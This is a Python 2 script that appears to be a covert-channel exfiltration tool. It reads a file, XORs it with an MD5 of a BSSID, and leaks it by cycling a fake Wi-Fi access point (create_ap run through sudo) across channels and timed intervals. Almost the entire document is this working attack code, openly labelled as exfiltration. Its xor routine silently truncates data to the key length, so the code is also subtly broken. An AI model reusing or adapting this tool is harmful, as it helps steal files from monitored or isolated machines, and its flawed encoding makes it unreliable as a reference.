import os
import sys
import md5
import binascii
import random
import time
import subprocess
import signal

def xor(binarystring1, binarystring2):
	binaryxor =""
	if(len(binarystring1)>len(binarystring2)):
		length=len(binarystring2)
	else:
		length=len(binarystring1)
	for i in range (0,length):
		if(binarystring1[i]==binarystring2[i]):
			binaryxor = binaryxor + '0'
		else:
			binaryxor = binaryxor + '1'
	return binaryxor

def getTime(info, lastTime):

	times = {"00": 10, "01": 20, "10": 30, "11": 40}
	times2 = {10: "00", 20: "01", 30: "10", 40: "11"}
	
	#XOR t = (i, t-1)
	xorResult = xor(times2[lastTime], info)
	return times[xorResult]



def encode(binaryString):
	simbols = {"01": [1,5],"10": [2,6],"11": [3,7],"00": [4,8]}
	redundancy = {1: 0, 2: 0, 3: 0, 4: 1, 5: 1, 6: 1, 7: 1, 8: 0}

	redRepChannel = {0: [9,11], 1: [10,12]}	
	repChannels = {0: 9, 1: 10, 2: 11, 3: 12}

	channels = []
	currentChannel = 0
	currentInfo = ""
	currentPair = ""
	lastInfo = ""
	redundancyBit = 0

	timers = []
	time = 10 ##It must be initialized to 10 because its bit information value is 00, and it won't affecte the first XOR

	print("START ENCODING")
	for i in range(0, len(binaryString) - 1, 2):
		currentPair = binaryString[i:i+2]

		#Select channel and time to be transmitted
		if(i==0):##First Channel
			if(random.randint(0,1)==0):
				currentChannel = simbols[currentPair][0]
			else:
				currentChannel = simbols[currentPair][1]
			##Then, it will be updated with the info transmitted at the last pair of bits		
		else:
			#Get redundancy bit		
			redundancyBit = xor(lastInfo[0],lastInfo[1])
			#Get info		
			currentInfo = simbols[currentPair]
			#Get Channel
			if(redundancy[currentInfo[0]]==int(redundancyBit)):
				currentChannel = currentInfo[0]
			else:
				currentChannel = currentInfo[1]
		
			##Check if it is a repeated channel, in which case it'll be used the channel 9, 10, 11 or 12			
			if(currentChannel==channels[len(channels)-1]):
				print(redRepChannel[int(redundancyBit)])
				if(random.randint(0,1)==0):
					currentChannel=redRepChannel[int(redundancyBit)][0]
				else:
					currentChannel=redRepChannel[int(redundancyBit)][1]
		
		##Add channel and timer to the lists to be transmitted
		channels.append(currentChannel)
		#Get transmission time
		time = getTime(currentPair, time)
		timers.append(time)
		##Update parameters
		lastInfo = currentPair			


	#Check first channel
	if(channels[0]==channels[1]):	
		channels[1]=repChannels[random.randint(0,3)]
	
	##Add channel 13
	channels.append(13)
	
	##Add last channel (redundancy bit of last channel of information)
	redLastChannel = xor(binaryString[len(binaryString)-1],binaryString[len(binaryString)-2])
	channels.append(redRepChannel[int(redLastChannel)][random.randint(0,1)])

	return [channels,timers]


def channelTransmission(channelToTransmit, timeToTransmit, bssid):

	command = "sudo gnome-terminal -x sh -c \"create_ap -n -c " + str(channelToTransmit) + " wlp3s0 fakenetwork\""

	proc1 = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
	time.sleep(timeToTransmit)
	print("Already slept " + str(timeToTransmit))
	os.system("create_ap --stop wlp3s0")
	print("Stop command executed")

def exfiltrateInfo(channels,times, bssid):

	##Make it use the channel 13 for 1 minute to simulate no exfiltration period of time
	channelTransmission(13,20,bssid)
	##Start of data exfiltration
	for i in range(0,len(times)):
		channelTransmission(channels[i],times[i],bssid)

	##Lasts the 13 and, at least, the redundancy bit of the last channel of information
	channelTransmission(channels[len(channels)-2],50,bssid)
	channelTransmission(channels[len(channels)-1],20,bssid)

	
## MAIN ##

#Get arguments
bssid = sys.argv[1]
exFile = sys.argv[2]

#Read data from file
f=open(exFile,"r")
if f.mode =="r":
	data = f.read().rstrip('\n').encode("hex")
	
print(type(data))
binary = lambda x: " ".join(reversed( [i+j for i,j in zip( *[ ["{0:04b}".format(int(c,16)) for c in reversed("0"+x)][n::2] for n in [1,0] ] ) ] ))
binarydata = binary(data).replace(" ","")
print(binarydata)
#Encipher data
m = md5.new()
m.update(bssid)
key = m.hexdigest()
binarykey = binary(key).replace(" ","")
binaryCiphertext = xor(binarykey,binarydata)

#Encode data
encodedMsg = encode(binaryCiphertext)

channels = encodedMsg[0]
timers = encodedMsg[1]
print("CHANNELS CHOSEN")
print(channels)
print("TIMES CHOSEN")
print(timers)
print()

#Exfiltration
print("EXFILTRATION STARTED")
exfiltrateInfo(channels,timers,bssid)
print("EXFILTRATION ENDED")







